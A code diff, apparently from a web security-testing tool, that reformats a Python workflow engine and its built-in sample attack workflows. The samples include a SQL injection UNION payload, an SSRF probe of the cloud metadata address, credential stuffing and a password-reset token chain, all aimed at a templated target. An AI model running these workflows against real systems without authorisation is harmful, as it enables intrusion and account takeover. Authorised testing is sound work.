@@ -11,9 +11,15 @@ logger = get_logger("workflow")
 
 
 class WorkflowStep:
-    def __init__(self, name: str, action: str, params: Dict = None,
-                 condition: Dict = None, retry: int = 0,
-                 retry_delay: float = 0):
+    def __init__(
+        self,
+        name: str,
+        action: str,
+        params: Dict = None,
+        condition: Dict = None,
+        retry: int = 0,
+        retry_delay: float = 0,
+    ):
         self.name = name
         self.action = action
         self.params = params or {}
@@ -46,7 +52,8 @@ class WorkflowStep:
         def _replace(m):
             key = m.group(1)
             return str(context.get(key, m.group(0)))
-        return re.sub(r'\{\{(\w+)\}\}', _replace, text)
+
+        return re.sub(r"\{\{(\w+)\}\}", _replace, text)
 
     def execute(self, context: Dict, http) -> Dict:
         if not self._check_condition(context):
@@ -106,6 +113,7 @@ class Workflow:
 
     def run(self, context: Dict = None) -> Dict:
         import requests
+
         http = requests.Session()
         http.verify = settings.verify_ssl
         http.headers["User-Agent"] = "Mozilla/5.0"
@@ -119,19 +127,21 @@ class Workflow:
         return {"workflow": self.name, "results": results}
 
     @classmethod
-    def from_json(cls, path: str) -> 'Workflow':
+    def from_json(cls, path: str) -> "Workflow":
         with open(path, "r", encoding="utf-8") as f:
             data = json.load(f)
         steps = []
         for s in data.get("steps", []):
-            steps.append(WorkflowStep(
-                name=s.get("name", ""),
-                action=s.get("action", ""),
-                params=s.get("params", {}),
-                condition=s.get("condition"),
-                retry=s.get("retry", 0),
-                retry_delay=s.get("retry_delay", 0),
-            ))
+            steps.append(
+                WorkflowStep(
+                    name=s.get("name", ""),
+                    action=s.get("action", ""),
+                    params=s.get("params", {}),
+                    condition=s.get("condition"),
+                    retry=s.get("retry", 0),
+                    retry_delay=s.get("retry_delay", 0),
+                )
+            )
         return cls(data.get("name", "workflow"), steps)
 
 
@@ -139,65 +149,116 @@ SAMPLE_WORKFLOWS: Dict[str, Dict[str, Any]] = {
     "login_and_extract": {
         "name": "login_and_extract",
         "steps": [
-            {"name": "get_login_page", "action": "http_get",
-             "params": {"url": "{{target}}/login", "method": "GET"}},
-            {"name": "submit_login", "action": "http_post",
-             "params": {"url": "{{target}}/login", "method": "POST",
-                        "data": {"username": "{{username}}", "password": "{{password}}"}}},
-            {"name": "extract_session", "action": "extract_session",
-             "params": {"url": "{{target}}/profile"}},
-        ]
+            {
+                "name": "get_login_page",
+                "action": "http_get",
+                "params": {"url": "{{target}}/login", "method": "GET"},
+            },
+            {
+                "name": "submit_login",
+                "action": "http_post",
+                "params": {
+                    "url": "{{target}}/login",
+                    "method": "POST",
+                    "data": {"username": "{{username}}", "password": "{{password}}"},
+                },
+            },
+            {
+                "name": "extract_session",
+                "action": "extract_session",
+                "params": {"url": "{{target}}/profile"},
+            },
+        ],
     },
     "sqli_extract_data": {
         "name": "sqli_extract_data",
         "steps": [
-            {"name": "test_injection", "action": "http_get",
-             "params": {"url": "{{target}}/page?id={{payload}}", "method": "GET"}},
-            {"name": "extract_version", "action": "http_get",
-             "params": {"url": "{{target}}/page?id=1'+UNION+SELECT+@@version--", "method": "GET"}},
-        ]
+            {
+                "name": "test_injection",
+                "action": "http_get",
+                "params": {"url": "{{target}}/page?id={{payload}}", "method": "GET"},
+            },
+            {
+                "name": "extract_version",
+                "action": "http_get",
+                "params": {
+                    "url": "{{target}}/page?id=1'+UNION+SELECT+@@version--",
+                    "method": "GET",
+                },
+            },
+        ],
     },
     "ssrf_to_internal": {
         "name": "ssrf_to_internal",
         "steps": [
-            {"name": "ssrf_probe", "action": "http_get",
-             "params": {"url": "{{target}}/fetch?url=http://169.254.169.254/latest/meta-data/",
-                        "method": "GET"}},
-        ]
+            {
+                "name": "ssrf_probe",
+                "action": "http_get",
+                "params": {
+                    "url": "{{target}}/fetch?url=http://169.254.169.254/latest/meta-data/",
+                    "method": "GET",
+                },
+            },
+        ],
     },
     "credential_stuffing": {
         "name": "credential_stuffing",
         "steps": [
-            {"name": "attempt_login", "action": "http_post",
-             "params": {"url": "{{target}}/login", "data": {"username": "{{username}}", "password": "{{password}}"}}},
-            {"name": "check_success", "action": "http_get",
-             "params": {"url": "{{target}}/dashboard"},
-             "condition": {"operator": "ne", "key": "attempt_login", "value": "401"}},
-        ]
+            {
+                "name": "attempt_login",
+                "action": "http_post",
+                "params": {
+                    "url": "{{target}}/login",
+                    "data": {"username": "{{username}}", "password": "{{password}}"},
+                },
+            },
+            {
+                "name": "check_success",
+                "action": "http_get",
+                "params": {"url": "{{target}}/dashboard"},
+                "condition": {"operator": "ne", "key": "attempt_login", "value": "401"},
+            },
+        ],
     },
     "multi_factor_auth": {
         "name": "multi_factor_auth",
         "steps": [
-            {"name": "submit_otp", "action": "http_post",
-             "params": {"url": "{{target}}/2fa", "data": {"code": "{{code}}"}}},
-        ]
+            {
+                "name": "submit_otp",
+                "action": "http_post",
+                "params": {"url": "{{target}}/2fa", "data": {"code": "{{code}}"}},
+            },
+        ],
     },
     "password_reset_chain": {
         "name": "password_reset_chain",
         "steps": [
-            {"name": "request_reset", "action": "http_post",
-             "params": {"url": "{{target}}/reset", "data": {"email": "{{email}}"}}},
-            {"name": "extract_token", "action": "http_get",
-             "params": {"url": "{{target}}/reset/token"}},
-            {"name": "set_new_password", "action": "http_post",
-             "params": {"url": "{{target}}/reset/confirm", "data": {"token": "{{token}}", "password": "{{password}}"}}},
-        ]
+            {
+                "name": "request_reset",
+                "action": "http_post",
+                "params": {"url": "{{target}}/reset", "data": {"email": "{{email}}"}},
+            },
+            {
+                "name": "extract_token",
+                "action": "http_get",
+                "params": {"url": "{{target}}/reset/token"},
+            },
+            {
+                "name": "set_new_password",
+                "action": "http_post",
+                "params": {
+                    "url": "{{target}}/reset/confirm",
+                    "data": {"token": "{{token}}", "password": "{{password}}"},
+                },
+            },
+        ],
     },
 }
 
 
 def run(workflow_name: str, context: Dict = None) -> Dict:
     import requests
+
     http = requests.Session()
     http.verify = settings.verify_ssl
     http.headers["User-Agent"] = "Mozilla/5.0"
@@ -205,14 +266,16 @@ def run(workflow_name: str, context: Dict = None) -> Dict:
         data = SAMPLE_WORKFLOWS[workflow_name]
         steps = []
         for s in data.get("steps", []):
-            steps.append(WorkflowStep(
-                name=s.get("name", ""),
-                action=s.get("action", ""),
-                params=s.get("params", {}),
-                condition=s.get("condition"),
-                retry=s.get("retry", 0),
-                retry_delay=s.get("retry_delay", 0),
-            ))
+            steps.append(
+                WorkflowStep(
+                    name=s.get("name", ""),
+                    action=s.get("action", ""),
+                    params=s.get("params", {}),
+                    condition=s.get("condition"),
+                    retry=s.get("retry", 0),
+                    retry_delay=s.get("retry_delay", 0),
+                )
+            )
         w = Workflow(data.get("name", workflow_name), steps)
         return w.run(context or {})
 
